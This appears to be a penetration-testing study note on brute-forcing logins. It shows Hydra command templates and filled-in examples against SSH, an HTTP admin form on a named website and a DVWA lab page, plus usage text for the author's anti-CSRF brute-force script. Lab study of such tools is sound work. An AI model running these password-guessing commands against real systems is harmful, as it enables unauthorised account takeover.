[[Brute-Force-Attack]]
## HYDRA
Is a brute force tool  
  
```  
Usage : hydra -l <user> -P <password list> <protocol>://<ip>:<port> -t <threads> -V  


hydra -l root -P /usr/share/wordlists/metasploit/unix \_passwords.txt ssh://10.0.2.6:22 -t 4 -V

```

hydra -l {username} -P {password list path} -s {port} -f {Site Address} http-post-form “{Path to postback page}:{USERNAME\_NAME}=^USER^&{PASSWORD\_NAME}=^PASS^:{failed login text}”

```
hydra -l hydra -P password.lst -s 80 -f www.sillychicken.co.nz http-post-form “/administrator/index.php:usrname=^USER^&pass=^PASS^&submit=Login:Incorrect Username”
```


### HYDRA with PHPSESSID

```
hydra 192.168.0.105 -V -l admin -P ~/rockyou.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=rname and/or password incorrect:H=Cookie: PHPSESSID=f8ucrbu0qmta4ettc3208gcvnq; security=low" -t 64

```

# My Tool
### Can be used to brute force a login form. Also supports anti-csrf token bypass.
```
./anti_csrf_brute.py -P ./password.txt -u http://192.168.0.112/dvwa/vulnerabilities/brute -c "PHPSESSID:tjj0esrnt64heiqr50hbbpj8s4;security:high;" -F incorrect -param username:admin;password:^PASS^;Login:Login;user_token:^CSRF^"


usage: anti_csrf_brute.py [-h] [-c COOKIES] [-u URL] [-param PARAM] [-l LOGIN]
                          [-p PASSWORD] [-L LOGINLIST] [-P PASSWORDLIST]
                          [-C CSRFXPATH] [-F FAILEDTEXT] [-m METHOD]

optional arguments:
  -h, --help            show this help message and exit
  -c COOKIES, --cookies COOKIES
                        Cookies: -c PHPSESSID:f8ucrbu0qmta4ettc3208gcvnq&
                        security:low
  -u URL, --url URL     URL: -u http://127.0.0.1/
  -param PARAM, --param PARAM
                        Param: -p username:admin; password:123456; OR -p
                        username:^USER^; password:^PASS^
  -l LOGIN, --login LOGIN
                        Login: -l admin
  -p PASSWORD, --password PASSWORD
                        Password: -p password
  -L LOGINLIST, --loginlist LOGINLIST
                        LoginList: -l ~/users.txt
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password: -p password
  -C CSRFXPATH, --csrfxpath CSRFXPATH
                        CSRF-Xpath: //input[@name='user_token']/@value
  -F FAILEDTEXT, --failedtext FAILEDTEXT
                        Failed Login Text: Incorrect password
  -m METHOD, --method METHOD
                        Method: -m get OR -m POST
```
![[Pasted image 20210117153716.png]]